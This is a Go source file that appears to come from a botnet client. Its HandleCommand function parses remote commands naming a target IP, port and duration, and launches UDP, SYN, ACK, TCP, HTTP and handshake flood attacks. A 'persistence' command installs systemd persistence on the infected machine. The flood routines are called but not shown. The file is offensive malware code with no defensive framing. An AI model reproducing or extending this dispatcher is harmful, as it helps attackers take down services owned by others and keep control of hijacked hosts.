package cmd

import (
	"fmt"
	"strconv"
	"strings"

	"bot/attacks"
)

// HandleCommand processes the incoming command and executes the corresponding attack.
func HandleCommand(command string) error {
	fields := strings.Fields(command)
	if len(fields) < 4 {
		return fmt.Errorf("invalid command format")
	}

	cmd := fields[0]
	targetIP := fields[1]
	targetPortStr := fields[2]
	durationStr := fields[3]

	// Convert the target port from string to integer
	targetPort, err := strconv.Atoi(targetPortStr)
	if err != nil {
		return fmt.Errorf("invalid target port: %w", err)
	}

	// Convert the duration from string to integer
	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		return fmt.Errorf("invalid duration: %w", err)
	}

	switch cmd {
	case "udpflood":
		go attacks.PerformUDPFlood(targetIP, targetPort, duration)
	case "synflood":
		go attacks.PerformSYNFlood(targetIP, targetPort, duration)
	case "ackflood":
		go attacks.PerformACKFlood(targetIP, targetPort, duration)
	case "tcpflood":
		go attacks.PerformTCPFlood(targetIP, targetPort, duration)
	case "httpflood":
		go attacks.PerformHTTPFlood(targetIP, duration, targetPort) // Call the HTTP flood function
	case "handshake":
		go attacks.PerformThreeWayHandshake(targetIP, duration, targetPort) // Call the HTTP flood function
	case "persistence":
		go SystemdPersistence() // Execute SystemdPersistence function
	default:
		return fmt.Errorf("unknown command: %s", cmd)
	}

	return nil
}